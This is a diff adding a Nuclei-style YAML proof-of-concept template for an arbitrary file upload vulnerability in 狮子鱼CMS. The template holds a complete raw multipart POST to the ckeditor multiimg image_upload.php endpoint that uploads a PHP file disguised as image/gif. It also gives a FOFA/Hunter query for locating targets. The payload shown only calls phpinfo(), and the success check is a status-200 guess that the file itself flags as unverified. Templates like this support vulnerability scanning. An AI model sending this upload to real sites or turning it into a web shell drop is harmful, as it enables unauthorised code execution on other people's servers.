@@ -1,0 +1,43 @@
+id: poc-4af5bf90548ceb5e9ae1
+info:
+  name: 狮子鱼CMSimage_upload存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4af5bf90548ceb5e9ae1b1c20ab08116
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4af5bf90548ceb5e9ae1b1c20ab08116
+    fofa: + hunter`app.name="狮子鱼CMS"`
+http:
+- raw:
+  - 'POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 162
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="files"; filename="1.php"
+
+    Content-Type: image/gif
+
+
+    <?php phpinfo(); ?>
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
